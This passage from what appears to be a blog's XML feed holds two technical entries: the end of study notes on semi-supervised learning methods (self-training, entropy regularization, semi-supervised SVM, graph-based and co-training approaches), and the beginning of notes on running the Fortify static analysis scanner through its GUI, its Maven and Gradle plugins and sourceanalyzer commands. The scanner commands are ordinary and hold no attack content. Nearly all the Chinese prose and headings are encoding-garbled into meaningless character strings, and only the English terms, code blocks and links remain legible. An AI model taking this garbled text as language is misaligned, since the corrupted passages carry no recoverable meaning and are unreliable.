        <content type="html"><![CDATA[<h1 id="åŸºæœ¬ä»‹ç»"><a href="#åŸºæœ¬ä»‹ç»" class="headerlink" title="åŸºæœ¬ä»‹ç»"></a>åŸºæœ¬ä»‹ç»</h1><p>åŠç›‘ç£ï¼ˆSemi-supervised Learningï¼‰å³è¾“å…¥å°éƒ¨åˆ†å·²æ ‡è®°æ•°æ®å’Œå¤§éƒ¨åˆ†æœªæ ‡è®°æ•°æ®è¿›è¡Œå­¦ä¹ ï¼Œä»¥æå‡å‡†ç¡®ç‡çš„ä¸€ç±»æœºå™¨å­¦ä¹ æ–¹æ³•ã€‚</p><p>æœ‰ä¸¤ç§ç”¨æ³•ï¼š</p><ul><li>Transductive learningï¼šæ— æ ‡è®°æ•°æ®å°±æ˜¯æµ‹è¯•é›†æœ¬èº«</li><li>Inductive learningï¼šæ— æ ‡è®°æ•°æ®ä¸æ˜¯æµ‹è¯•é›† </li></ul><a id="more"></a><p>ä¹‹æ‰€ä»¥æœ‰æ•ˆæœçš„åŸå› ï¼šæœªæ ‡è®°çš„æ•°æ®çš„ç‰¹å¾æ˜¯æœ‰ä»·å€¼çš„ï¼Œä¾‹å¦‚ä¸‹å›¾ï¼Œæœªæ ‡è®°çš„æ ·æœ¬åˆ†å¸ƒå†³å®šSVMçš„è¶…å¹³é¢æ€ä¹ˆåˆ’ï¼š</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571834496021.png" alt="1571834496021"></p><p>ä½†æ˜¯è¿™ä¹Ÿä¸ç»å¯¹ï¼Œå› ä¸ºå¦‚æœå·¦ä¸‹çš„æ•°æ®ç‚¹æ—¶ç‹—çš„è¯é‚£ä¹ˆå¹³é¢å°±ä¸æ˜¯è¿™æ ·äº†ï¼Œå› æ­¤åŠç›‘ç£ä¸ä¸€å®šæ•ˆæœå¥½ï¼Œå…¶å…³é”®åœ¨äºå‡è®¾æ˜¯å¦ç¬¦åˆå®é™…ã€‚</p><h1 id="Semi-supervised-Generative-Model-ç”Ÿæˆå¼æ–¹æ³•"><a href="#Semi-supervised-Generative-Model-ç”Ÿæˆå¼æ–¹æ³•" class="headerlink" title="Semi-supervised Generative Model(ç”Ÿæˆå¼æ–¹æ³•)"></a>Semi-supervised Generative Model(ç”Ÿæˆå¼æ–¹æ³•)</h1><p>å…ˆç»™å‡ºåˆå§‹å€¼ï¼Œæ¥ç€è®¡ç®—æ— æ ‡è®°æ•°æ®çš„$p\theta(C_1|x^u)$ï¼Œå†æ›´æ–°æ¨¡å‹çš„$P(C_1)$å’Œ$\mu$ï¼Œåå¤è¿­ä»£ç›´åˆ°ç®—æ³•æ”¶æ•›</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024110951281.png" alt="image-20191024110951281"></p><h1 id="Self-training"><a href="#Self-training" class="headerlink" title="Self-training"></a>Self-training</h1><ol><li>ç”¨æ ‡è®°æ•°æ®ç”Ÿæˆæ¨¡å‹</li><li>ç”¨æ¨¡å‹é¢„æµ‹æœªæ ‡è®°æ•°æ®</li><li>å°†éƒ¨åˆ†é¢„æµ‹çš„æ ‡è®°æ•°æ®ä»æœªæ ‡è®°æ•°æ®ä¸­ç§»åˆ°å·²æ ‡è®°æ•°æ®ä¸­ï¼Œå†å›åˆ°ç¬¬ä¸€æ­¥ï¼Œè¿™é‡Œç§»åŠ¨çš„ç­–ç•¥éœ€è¦è‡ªå·±å†³å®š</li></ol><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024111124407.png" alt="image-20191024111124407"></p><h1 id="Generative-Model-amp-Self-training"><a href="#Generative-Model-amp-Self-training" class="headerlink" title="Generative Model &amp; Self-training"></a>Generative Model &amp; Self-training</h1><p>Generative Modelå¯¹æœªæ ‡è®°æ•°æ®å±äºå“ªä¸€ç±»ä¸æ˜¯ç¡®å®šçš„ï¼Œè€Œæ˜¯ä¸€ä¸ªå¯èƒ½æ€§ï¼Œè€ŒSelf-trainingå¯¹ä¸æœªæ ‡è®°æ•°æ®ä¼šç»™å‡ºå±äºå“ªä¸€ç±»ï¼Œéé»‘å³ç™½ã€‚</p><p>å¯¹äºç¥ç»ç½‘ç»œæ¥è¯´ï¼ŒGenerative Modelä¸é€‚ç”¨</p><p>å¯¹äºç›´æ¨å­¦ä¹ æ¥è¯´ï¼ŒSelf-traingingä¸é€‚ç”¨ï¼ˆå› ä¸ºæœªæ ‡è®°çš„æ•°æ®æœ¬èº«å°±æ˜¯éœ€è¦é¢„æµ‹çš„ï¼Œç¬¬ä¸€æ¬¡å·²ç»èƒ½ç»™å‡ºç»“æœï¼‰</p><h1 id="Entropy-based-Regularization"><a href="#Entropy-based-Regularization" class="headerlink" title="Entropy-based Regularization"></a>Entropy-based Regularization</h1><p>Self-trainingçš„ä¼˜åŒ–ç‰ˆï¼Œä½¿å…¶é€‚ç”¨äºç¥ç»ç½‘ç»œï¼Œå…¶æ€æƒ³æ˜¯è®¤ä¸ºï¼Œå¦‚æœ$y^u$çš„åˆ†å¸ƒè¾ƒä¸ºé›†ä¸­ï¼Œé‚£ä¹ˆåˆ†ç±»æ•ˆæœæ¯”è¾ƒå¥½ï¼Œè€Œè‹¥$y^u$åˆ†å¸ƒä¸é›†ä¸­ï¼Œåˆ™ç¥ç»ç½‘ç»œæ•ˆæœè¾ƒå·®ï¼Œå› æ­¤å†æŸå¤±å‡½æ•°æ€»å¢åŠ Eçš„åº¦é‡ï¼ŒEä¸ºEntropyï¼Œè¡¨ç¤ºäº†åˆ†å¸ƒæ˜¯å¦é›†ä¸­ </p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571835087936.png" alt="1571835087936"></p><h1 id="Semi-supervised-SVM"><a href="#Semi-supervised-SVM" class="headerlink" title="Semi-supervised SVM"></a>Semi-supervised SVM</h1><p>æšä¸¾æœªæ ‡è®°çš„æ‰€æœ‰å¯èƒ½æ€§ï¼Œæœ€å¤§åŒ–marginå’Œleast error</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024121420642.png" alt="image-20191024121420642"></p><h1 id="Smoothness-Assumption"><a href="#Smoothness-Assumption" class="headerlink" title="Smoothness Assumption"></a>Smoothness Assumption</h1><p>å‡è®¾ï¼šå¦‚æœ$x_1$å’Œ$x_2$ç›¸ä¼¼ï¼Œé‚£ä¹ˆ$y_1$å¯èƒ½ç­‰äº$y_2$ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼Œ$x_1$å’Œ$x_2$åœ¨åŒä¸€é«˜å¯†åº¦çš„åŒºåŸŸçš„åŒºåŸŸä¸Šï¼Œé‚£ä¹ˆå®ƒä»¬å¯èƒ½ä¸€è‡´ï¼ˆæ„Ÿè§‰å¾ˆåƒåŸºäºå¯†åº¦çš„èšç±»ç®—æ³•ï¼‰</p><p>åˆç”±äºæœªæ ‡è®°æ ·æœ¬çš„ç‰¹å¾å¯ä»¥å¡«å……å¯†åº¦ï¼Œç†è®ºä¸Šæ˜¯æœ‰æ•ˆçš„ã€‚</p><p>å› æ­¤å…·ä½“åšæ³•ï¼šå…ˆèšç±»ï¼Œç„¶åå†Label</p><h2 id="Graph-based-Approach"><a href="#Graph-based-Approach" class="headerlink" title="Graph-based Approach"></a>Graph-based Approach</h2><p>å°†$x$è§†ä¸ºç‚¹ï¼Œåœ¨ç‚¹ä¹‹é—´è¿è¾¹ï¼Œæ„æˆå›¾ï¼Œå¦‚æœä¸¤ç‚¹ä¹‹é—´å¯è¾¾ï¼Œé‚£ä¹ˆè®¤ä¸ºä¸¤æ¡æ•°æ®æ˜¯ç›¸ä¼¼çš„ã€‚å¦‚ä¸‹å¦‚ï¼Œæ–¹å—å’Œä¸‰è§’è™½ç„¶è·ç¦»å¾ˆè¿‘ï¼Œä½†æ˜¯ç”±äºå®ƒä»¬ä¸å¯è¾¾ï¼Œå› æ­¤å®ƒä»¬ä¸ç›¸ä¼¼</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571836705037.png" alt="1571836705037"></p><p>æœ‰äº›æ—¶å€™ï¼Œè¿™äº›è¾¹æ˜¯ç°æˆå°±æœ‰çš„ï¼Œæ¯”å¦‚è¯´è®ºæ–‡ä¹‹é—´çš„äº’ç›¸å¼•ç”¨ï¼Œç½‘é¡µé—´çš„è¶…é“¾æ¥ã€‚</p><p>æœ‰äº›æƒ…å†µä¸‹æ˜¯æ²¡æœ‰çš„ï¼Œåªèƒ½é€šè¿‡ä¸€äº›ç»éªŒæ¥æ„é€ è¾¹ï¼Œæ¯”å¦‚ä½¿ç”¨kè¿‘é‚»ï¼Œe-è¿‘é‚»ï¼ˆæ¨èï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè·ç¦»æ¨èä½¿ç”¨Gaussian Radial Basisï¼Œåªæœ‰é è¿‘çš„ç‚¹æ‰ä¼šç¬¦åˆè¦æ±‚</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/1571837008739.png" alt="1571837008739"></p><p>è¯¥æ–¹æ³•çš„ä¼˜åŠ¿åœ¨äºèµ‹äºˆäº†æ ‡è®°æ•°æ®â€œä¼ æŸ“æ€§â€ï¼Œå…¶å¯ä»¥å»¶è¾¹ä¼ æ’­åˆ°æ‰€æœ‰ç±»æˆå‘˜ã€‚åŠ£åŠ¿åœ¨äºæœªæ ‡è®°æ•°æ®è¦è¶³å¤Ÿå¤šï¼Œå¦åˆ™æ— æ³•ä¼ é€’ã€‚</p><p>å®šé‡åˆ†æsmoothnessï¼š</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024115845979.png" alt="image-20191024115845979"></p><p>å¦å¤–$S$å¯ä»¥é€šè¿‡çŸ©é˜µè¿ç®—å¾—åˆ°ï¼Œå³è®¡ç®—L, Wä¸ºå›¾çš„é‚»æ¥çŸ©é˜µï¼ŒDçš„å¯¹è§’çº¿ä¸Šçš„å€¼ä¸ºæ¯è¡Œçš„å’Œ</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024120650988.png" alt="image-20191024120650988"></p><p>åœ¨ç¥ç»ç½‘ç»œä¼ æ’­æ—¶ï¼Œå°†Sä¹˜ä¸Šæƒé‡$\lambda$åŠ åˆ°æŸå¤±å‡½æ•°ä¸Šï¼š</p><p><img src="/ml-åŠç›‘ç£æœºå™¨å­¦ä¹ å­¦ä¹ ç¬”è®°/image-20191024121139659.png" alt="image-20191024121139659"></p><h1 id="Disagreement-based-methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰"><a href="#Disagreement-based-methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰" class="headerlink" title="Disagreement-based methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰"></a>Disagreement-based methodï¼ˆåŸºäºåˆ†æ­§çš„æ–¹æ³•ï¼‰</h1><p>é¦–å…ˆæå‡ºå¤šè§†å›¾çš„æ¦‚å¿µï¼Œå³ä¸€ä¸ªæ•°æ®å¯¹è±¡åœ¨å¤šä¸ªæ–¹é¢å­˜åœ¨å¤šä¸ªæ•°æ®é›†ï¼Œæ¯”å¦‚ç”µå½±ï¼Œå°±å­˜åœ¨å›¾åƒç”»é¢çš„æ•°æ®é›†å’Œå£°éŸ³çš„æ•°æ®é›†ï¼ˆä¸¤ä¸ªè§†å›¾ï¼‰ï¼Œå› æ­¤å¯¹äºå¤šä¸ªæ–¹é¢ï¼ˆè§†å›¾ï¼‰å»ºç«‹å¤šä¸ªæ¨¡å‹ã€‚</p><p>å¤šä¸ªæ¨¡å‹é—´å¯ä»¥å±•å¼€ååŒè®­ç»ƒï¼Œå³å…ˆåœ¨æ¯ä¸ªè§†å›¾ä¸Šï¼Œä½¿ç”¨å·²æ ‡è®°çš„æ•°æ®è®­ç»ƒå‡ºåˆ†ç±»å™¨ï¼Œè®©æ¯ä¸€ä¸ªåˆ†ç±»å™¨æ ‡è®°æœªæ ‡è®°çš„æ•°æ®ï¼Œé€‰æ‹©æœ€æœ‰æŠŠæ¡çš„æœªæ ‡è®°æ ·æœ¬èµ‹äºˆä¼ªæ ‡è®°æ”¾å…¥è®­ç»ƒé›†ï¼Œå†å°†æ–°çš„è®­ç»ƒé›†ç»™å¦ä¸€è§†å›¾ä¸Šçš„åˆ†ç±»å™¨è®­ç»ƒï¼Œç›´åˆ°åˆ†ç±»å™¨ç»“æœä¸å†å˜åŒ–ã€‚</p><p>è¯¥æ–¹æ³•ç»è¿‡æ”¹é€ ï¼Œå¯ä»¥ç”¨äºå•è§†å›¾ï¼Œä»…éœ€ä¸åŒåˆ†ç±»å™¨å°±å¯æå‡æ•ˆæœã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><p>Machine Learning (Hung-yi Lee, NTU) ï¼Œ <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> ï¼ˆå›¾ç‰‡æ¥æºï¼Œæè€å¸ˆè®²çš„è¯¾çœŸçš„å¾ˆå¥½ï¼Œå¤§å®¶å¯ä»¥å¬å¬çœ‹ï¼‰</p></li><li><p>å‘¨å¿—å. æœºå™¨å­¦ä¹ [M]. æ¸…åå¤§å­¦å‡ºç‰ˆç¤¾, 2016. </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> åŠç›‘ç£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fortifyä½¿ç”¨åˆæ¢</title>
      <link href="/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
      <url>/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h1><h2 id="GUIå…¥å£"><a href="#GUIå…¥å£" class="headerlink" title="GUIå…¥å£"></a>GUIå…¥å£</h2><p>å¦‚æœæœ‰GUIï¼Œç›´æ¥è¿è¡ŒScanWizardï¼ŒæŒ‰ç…§æ­¥éª¤ç‚¹ä¸‹å»å°±è¡Œäº†ï¼Œç»“æŸåä¼šåœ¨é¡¹ç›®æ–‡ä»¶å¤¹ä¸‹ç”ŸæˆFortify{ProjName}çš„batæˆ–shæ–‡ä»¶ï¼Œè¿è¡Œå³å¯å¼€å§‹æ‰«æï¼Œç»“æŸåä¼šç”ŸæˆFortify{ProjName}.fpræ–‡ä»¶ï¼ŒåŒå‡»æ‰“å¼€å¯ä»¥æŸ¥çœ‹æ¼æ´å’Œæ£€æŸ¥æŠ¥å‘Šã€‚</p><a id="more"></a><h2 id="Javaé¡¹ç›®"><a href="#Javaé¡¹ç›®" class="headerlink" title="Javaé¡¹ç›®"></a>Javaé¡¹ç›®</h2><p>å¦‚æœæ˜¯javaé¡¹ç›®ï¼Œç”Ÿæˆé¡¹ç›®æ—¶ä¼šæç¤ºé¡¹ç›®ç¼ºå°‘ä¾èµ–ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/whitebox-Fortifyä½¿ç”¨åˆæ¢/1570934969767.png" alt="1570934969767"></p><p>ä¸èƒ½è§£æçš„ç±»ä¼šä¸¥é‡å½±å“æ‰«ææ•ˆæœï¼ˆè§ä¸‹æ–‡ï¼‰ï¼Œå› æ­¤ä¸€å®šè¦æŒ‡å®šç¬¬ä¸‰æ–¹ä¾èµ–ä½ç½®ï¼Œä½†æ˜¯ç°åœ¨å¾ˆå¤šé¡¹ç›®é‡‡ç”¨Mavenæˆ–è€…Gradleæ„å»ºï¼Œæ­¤æ—¶é™¤äº†æ‰‹å·¥æŒ‡å®šlibç›®å½•å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸‹é¢Mavenå’ŒGradleé¡¹ç›®æ’ä»¶çš„æ‰«ææ–¹æ³•</p><h3 id="Mavené¡¹ç›®"><a href="#Mavené¡¹ç›®" class="headerlink" title="Mavené¡¹ç›®"></a>Mavené¡¹ç›®</h3><p>è‹¥ä¸ºmavené¡¹ç›®ï¼Œå…ˆåœ¨<code>.../Fortify/Fortify_SCA_and_Apps_{version}/plugins/maven</code>æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°<code>maven-plugin-bin.zip</code>è§£å‹ï¼Œç„¶å<code>maven clean install</code>å®‰è£…åˆ°æœ¬åœ°ä»“åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip maven-plugin-bin.zip -d /tmp/maven-plugin-bin</span><br><span class="line"><span class="built_in">cd</span> /tmp/maven-plugin-bin</span><br><span class="line">./install.sh <span class="comment"># winä¸ºinstall.bat</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç”¨ScanWizardæ—¶ç¬¬äºŒæ­¥ï¼Œå‹¾é€‰Mavenï¼Œå†ç®€å•é…ç½®ä¸€ä¸‹mavenå³å¯</p><p><img src="/whitebox-Fortifyä½¿ç”¨åˆæ¢/1570935982602.png" alt="1570935982602"></p><p><img src="/whitebox-Fortifyä½¿ç”¨åˆæ¢/1570935962839.png" alt="1570935962839"></p><h3 id="Gradleé¡¹ç›®"><a href="#Gradleé¡¹ç›®" class="headerlink" title="Gradleé¡¹ç›®"></a>Gradleé¡¹ç›®</h3><p>gradleæ²¡æœ‰å›¾å½¢åŒ–å…¥å£ï¼Œæ€ä¹ˆç”¨è§â€œCLIå…¥å£â€ç« èŠ‚</p><h3 id="åŠ ä¾èµ–å’Œä¸åŠ ä¾èµ–çš„æ•ˆæœå¯¹æ¯”"><a href="#åŠ ä¾èµ–å’Œä¸åŠ ä¾èµ–çš„æ•ˆæœå¯¹æ¯”" class="headerlink" title="åŠ ä¾èµ–å’Œä¸åŠ ä¾èµ–çš„æ•ˆæœå¯¹æ¯”"></a>åŠ ä¾èµ–å’Œä¸åŠ ä¾èµ–çš„æ•ˆæœå¯¹æ¯”</h3><p>è¿™é‡Œå¯¹æ¯”ä¸€ä¸‹æœªåŠ ä¾èµ–å’Œæ·»åŠ ä¾èµ–å/ç”¨mavenæ’ä»¶çš„æ‰«æç»“æœï¼Œç”¨java-sec-codeæµ‹è¯•ï¼Œä»å·¦åˆ°å³ä¾æ¬¡ä¸ºæœªåŠ ä¾èµ–(src)ï¼Œæ‰‹å·¥æŒ‡å®šlibç›®å½•(lib)å’Œmavenæ’ä»¶(maven)</p><p><img src="/whitebox-Fortifyä½¿ç”¨åˆæ¢/1570954530446.png" alt="1570954530446"></p><p>å¯ä»¥çœ‹åˆ°å†é«˜å±æ¼æ´è¿™é‡Œï¼Œä¸åŠ ä¾èµ–æ¼æ‰äº†XSSã€PathManipulationå’ŒSQLæ³¨å…¥çš„ç¼ºé™·ï¼Œå¹¶ä¸”åœ¨ä¸­å±å’Œä½å±æ¼æ´æ–¹é¢çš„ç¼ºé™·æ£€å‡ºç‡ä¹Ÿè¿œä½äºåŠ ä¾èµ–çš„ç»“æœï¼ˆæ³¨æ„åˆ°æ‰‹åŠ¨æŒ‡å®šlibçš„ä¸­å±ç¼ºé™·æ¯”mavenæ’ä»¶çš„å¤šä¸€ä¸ªï¼Œå®é™…ä¸Šæ˜¯åœ¨libä¸­æœ‰ä¸€ä¸ªç¼ºé™·é‡å¤äº†ä¸¤æ¬¡ï¼‰</p><h2 id="CLIå…¥å£ï¼ˆåªé’ˆå¯¹javaï¼‰"><a href="#CLIå…¥å£ï¼ˆåªé’ˆå¯¹javaï¼‰" class="headerlink" title="CLIå…¥å£ï¼ˆåªé’ˆå¯¹javaï¼‰"></a>CLIå…¥å£ï¼ˆåªé’ˆå¯¹javaï¼‰</h2><p>GUIè™½ç„¶å¥½ç”¨ï¼Œä½†æ˜¯CLIå…¥å£æ›´æ–¹ä¾¿æˆ‘ä»¬å°è£…åšäºŒæ¬¡å¼€å‘ã€‚</p><p>çœ‹ä¸€ä¸‹å®˜æ–¹çš„æ‰‹å†Œæˆ–è€…åˆ†æä¸€ä¸‹GUIç”Ÿæˆçš„è„šæœ¬ï¼Œå¯ä»¥å¾—çŸ¥fortifyæ‰«æä¸»è¦åˆ†ä¸ºä¸€ä¸‹å‡ æ­¥</p><ol><li><p>Extracting Arguments Fileï¼Œç”Ÿæˆå‚æ•°åˆ—è¡¨ï¼Œä¿å­˜åˆ°Fortify{ProjName}.sh.argsæ–‡ä»¶ä¸­ï¼Œå‚æ•°æŠ¥åˆŠäº†javaçš„classpath(-cp)ï¼Œjavaç‰ˆæœ¬ï¼Œæ’é™¤ç›®å½•ï¼Œå¾…æ‰«æçš„ç›®å½•ï¼Œç”±äºå‘½ä»¤è¡Œé•¿åº¦é™åˆ¶æ‰€ä»¥éœ€è¦å•ç‹¬ä¿å­˜æˆæ–‡ä»¶ï¼Œç”Ÿæˆçš„å®ä¾‹æ–‡ä»¶å¦‚ä¸‹(<code>FortifyXXX.sh.args</code>)ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"-cp"</span></span><br><span class="line"><span class="string">"/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master/support/build/libs/support-0.2.1-sources.jar:/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master/support/build/classes/java/test:/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master/support/build/libs/support-0.2.1-javadoc.jar:/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master/support/build/libs/support-0.2.1.jar"</span></span><br><span class="line"><span class="string">"-source"</span></span><br><span class="line"><span class="string">"1.8"</span></span><br><span class="line"><span class="string">"-exclude"</span> <span class="string">"/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master/**/*.jar"</span></span><br><span class="line"><span class="string">"-exclude"</span> <span class="string">"/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master/**/*.class"</span></span><br><span class="line"><span class="string">"/home/anemone/all_my_work/whitebox_scanner/downloads/graphql_java_gen-master"</span></span><br></pre></td></tr></table></figure></li><li><p>Cleaning previous scan artifactsï¼Œå³æ¸…é™¤ä¸Šä¸€æ¬¡æ‰«æ</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sourceanalyzer -Xmx14237M -Xms400M -Xss24M -b buildXXX -clean</span><br></pre></td></tr></table></figure></li><li><p>Translating filesï¼Œå³ç¼–è¯‘æ–‡ä»¶åˆ°ä¸­é—´è¯­è¨€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sourceanalyzer -Xmx14237M -Xms400M -Xss24M -b buildXXX @FortifyXXX.sh.args</span><br></pre></td></tr></table></figure></li><li><p>Testing Difference between Translationsï¼Œä¸æ˜¯å¤ªæ¸…æ¥šè¿™ä¸€æ­¥æ˜¯åšå•¥çš„</p></li><li><p>Starting scanï¼Œå¼€å§‹æ‰«æ</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sourceanalyzer -Xmx14237M -Xms400M -Xss24M -b buildXXX  -scan -f result.fpr</span><br></pre></td></tr></table></figure></li></ol><p>é‚£ä¹ˆæç‚¼ä¸€ä¸‹ï¼Œæœ€ç®€å•çš„å‘½ä»¤åº”è¯¥å°±æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sourceanalyzer -Xmx14237M -Xms400M -Xss24M -b buildXXX -clean </span><br><span class="line">sourceanalyzer -Xmx14237M -Xms400M -Xss24M -b buildXXX -cp <span class="string">"lib/xxx.jar:lib/yyy.jar"</span> -<span class="built_in">source</span> 1.8 -exclude <span class="string">"**/*.jar"</span> -exclude <span class="string">"**/*.class"</span> &lt;ProjDir&gt; </span><br><span class="line">sourceanalyzer -Xmx14237M -Xms400M -Xss24M -b buildXXX  -scan -f result.fpr</span><br></pre></td></tr></table></figure><p>ç‰¹åˆ«çš„ï¼Œmavené¡¹ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sourceanalyzer -b buildxyz mvn clean compile</span><br><span class="line">sourceanalyzer -b buildxyz -scan -f result.fpr</span><br></pre></td></tr></table></figure><p>Gradleé¡¹ç›®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sourceanalyzer -b buildxyz gradle clean build .</span><br><span class="line">sourceanalyzer -b buildxyz -scan -f result.fpr</span><br></pre></td></tr></table></figure><h1 id="åŸç†æµ…æ"><a href="#åŸç†æµ…æ" class="headerlink" title="åŸç†æµ…æ"></a>åŸç†æµ…æ</h1><p>Fortifyä½¿ç”¨æ–‡æ¡£ä¸­ä»‹ç»äº†å…¶ä½¿ç”¨çš„åˆ†æå™¨ï¼Œè¿™é‡Œç»™å¤§å®¶ç¿»è¯‘ä¸€ä¸‹</p><ul><li><p>Buffer</p><p>ç¼“å†²åŒºæº¢å‡ºåˆ†æå™¨ï¼Œå¯ä»¥æ˜¾ç¤ºæ•°æ®æµ</p></li><li><p>Configuration</p><p>é…ç½®åˆ†æå™¨ï¼Œç”¨æ¥åˆ†æé¡¹ç›®ä¸­çš„é”™è¯¯é…ç½®</p></li><li><p>Content</p><p>HTMLå†…å®¹åˆ†æå™¨ï¼Œé™¤äº†åˆ†æHTMLå¤–è¿˜ä¼šåˆ†æPHPï¼ŒJSPå’ŒASPæ–‡ä»¶</p></li><li><p>Control Flow</p><p>æ§åˆ¶æµåˆ†æå™¨ï¼Œç”¨æ¥æ£€æµ‹æ½œåœ¨å±é™©çš„æ“ä½œåºåˆ—ã€‚é€šè¿‡åˆ†æç¨‹åºä¸­çš„æ§åˆ¶æµè·¯å¾„ï¼Œæ§åˆ¶æµåˆ†æå™¨ç¡®å®šä¸€ç»„æ“ä½œæ˜¯å¦æŒ‰ä¸€å®šçš„é¡ºåºæ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œæ§åˆ¶æµåˆ†æå™¨æ£€æµ‹æœªåˆå§‹åŒ–å˜é‡ï¼ŒXMLæ˜¯å¦æ­£ç¡®é…ç½®ã€‚</p></li><li><p>Data Flow</p><p>æ•°æ®æµåˆ†æå™¨ï¼Œåº”è¯¥æ˜¯æœ€å¸¸è§ä¹Ÿæ˜¯æ•ˆæœæœ€å¥½çš„åˆ†æå™¨äº†ã€‚é€šè¿‡æ±¡ç‚¹ä¼ æ’­æŠ€æœ¯ï¼Œæ£€æµ‹ç”¨æˆ·è¾“å…¥ï¼ˆsourceï¼‰æ˜¯å¦ä¼šä¼ æ’­åˆ°å±é™©å‡½æ•°ï¼ˆsinkï¼‰ç‚¹ä¸­ï¼Œä¸€èˆ¬çš„XSSã€SQLIéƒ½æ˜¯è¿™ä¸ªåˆ†æå™¨æ‰«æå‡ºæ¥çš„ã€‚</p></li><li><p>Higher Order</p><p>ä¸çŸ¥é“å’‹ç¿»è¯‘ï¼Œä¸ºåŠ¨æ€è¯­è¨€è®¾è®¡çš„æ•°æ®æµåˆ†æå™¨ï¼Œç”¨æ¥åº”å¯¹é«˜é˜¶å‡½æ•°ç¼–ç¨‹è€Œè®¾è®¡çš„åˆ†æå™¨ï¼Œé«˜é˜¶å‡½æ•°ç¼–ç¨‹åœ¨åŠ¨æ€è¯­è¨€ï¼ˆå¦‚pythonï¼Œjså’Œswiftï¼‰ä¸­å¾ˆå¸¸è§ï¼Œå…·ä½“æ¥è¯´å³ä½¿ç”¨åŒ¿åè¡¨è¾¾å¼ç”Ÿæˆå‡½æ•°ï¼Œè€Œè¯¥åˆ†æå™¨å°±è¦è·Ÿè¸ªè¿™äº›åŒ¿åå‡½æ•°çš„æ•°æ®æµã€‚</p></li><li><p>Semantic</p><p>è¯­ä¹‰åˆ†æå™¨ï¼Œç”¨æ¥å‘ç°ä¸å®‰å…¨çš„å‡½æ•°ä½¿ç”¨ï¼Œä¾‹å¦‚javaè¢«åºŸå¼ƒçš„æ–¹æ³•å’ŒC/C++ä¸­çš„gets()</p></li><li><p>Structural</p><p>ç»“æ„åˆ†æå™¨ï¼Œä¸æ˜¯å¾ˆæ¸…æ¥šåŸç†ï¼Œæ–‡æ¡£ä¸­è¯´å…¶ç”¨æ¥åˆ†ææ­»ä»£ç 